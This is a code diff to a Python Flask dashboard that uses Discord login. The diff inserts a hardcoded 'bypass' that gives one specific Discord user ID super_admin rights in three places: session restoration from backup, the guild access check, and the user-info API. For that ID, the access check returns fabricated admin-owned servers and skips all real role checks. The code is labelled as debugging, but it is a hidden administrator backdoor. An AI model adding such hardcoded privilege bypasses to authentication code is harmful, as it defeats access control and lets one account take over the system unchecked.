@@ -179,7 +179,20 @@ try:
                     # Tenter de récupérer la session depuis la DB
                     user_data = db.get_session_user(backup_token)
                     if user_data:
-                        print(f"✅ Session restaurée depuis backup pour: {user_data.get('username', 'Inconnu')}")
+                        user_id = user_data.get('user_id', '')
+                        username = user_data.get('username', 'Inconnu')
+                        
+                        # SYSTÈME DE BYPASS POUR DEBUG
+                        BYPASS_USERS = {
+                            "431359112039890945": "super_admin",  # xero3elite
+                        }
+                        
+                        permission_level = user_data.get('access_level', 'member')
+                        if user_id in BYPASS_USERS:
+                            permission_level = BYPASS_USERS[user_id]
+                            print(f"🚀 BYPASS SESSION - Utilisateur: {username} ({user_id}) - Niveau: {permission_level}")
+                        
+                        print(f"✅ Session restaurée depuis backup pour: {username}")
                         # Recréer la session Flask
                         session.permanent = True
                         session['user_info'] = {
@@ -623,7 +636,38 @@ try:
                 """Vérifier l'accès et déterminer le niveau de permission basé sur les serveurs Discord"""
                 print(f"🔐 Vérification d'accès et rôles pour {len(user_guilds)} serveurs...")
                 
-                # Niveaux de permission
+                # === SYSTÈME DE BYPASS POUR AUTORISATIONS SPÉCIALES ===
+                BYPASS_USERS = {
+                    "431359112039890945": "super_admin",  # xero3elite - ACCÈS TOTAL
+                    # Ajouter d'autres IDs ici si nécessaire
+                    # "AUTRE_ID": "admin",
+                    # "AUTRE_ID": "moderator",
+                }
+                
+                # Vérifier si l'utilisateur a un bypass
+                if user_id in BYPASS_USERS:
+                    bypass_level = BYPASS_USERS[user_id]
+                    print(f"🚀 BYPASS AUTORISÉ - Utilisateur: {user_id} - Niveau: {bypass_level}")
+                    
+                    # Créer des serveurs fictifs pour le bypass avec toutes les permissions
+                    accessible_servers = [
+                        {
+                            "id": "bypass_server_1",
+                            "name": "🛡️ Arsenal Control Panel",
+                            "permissions": "8",  # Admin permissions
+                            "owner": True
+                        },
+                        {
+                            "id": "bypass_server_2", 
+                            "name": "🔧 System Management",
+                            "permissions": "8",
+                            "owner": True
+                        }
+                    ]
+                    
+                    return True, bypass_level, accessible_servers
+                
+                # Niveaux de permission normaux
                 permission_level = "member"  # Par défaut
                 accessible_servers = []
                 
@@ -1330,7 +1374,20 @@ try:
                 # Tenter de récupérer la session depuis la DB
                 user_data = db.get_session_user(backup_token)
                 if user_data:
-                    print(f"✅ API user/info: Session restaurée depuis backup pour: {user_data.get('username', 'Inconnu')}")
+                    user_id = user_data.get('user_id', '')
+                    username = user_data.get('username', 'Inconnu')
+                    
+                    # SYSTÈME DE BYPASS POUR DEBUG API
+                    BYPASS_USERS = {
+                        "431359112039890945": "super_admin",  # xero3elite
+                    }
+                    
+                    permission_level = user_data.get('access_level', 'member')
+                    if user_id in BYPASS_USERS:
+                        permission_level = BYPASS_USERS[user_id]
+                        print(f"🚀 BYPASS API - Utilisateur: {username} ({user_id}) - Niveau: {permission_level}")
+                    
+                    print(f"✅ API user/info: Session restaurée depuis backup pour: {username}")
                     # Recréer la session Flask
                     session.permanent = True
                     session['user_info'] = {
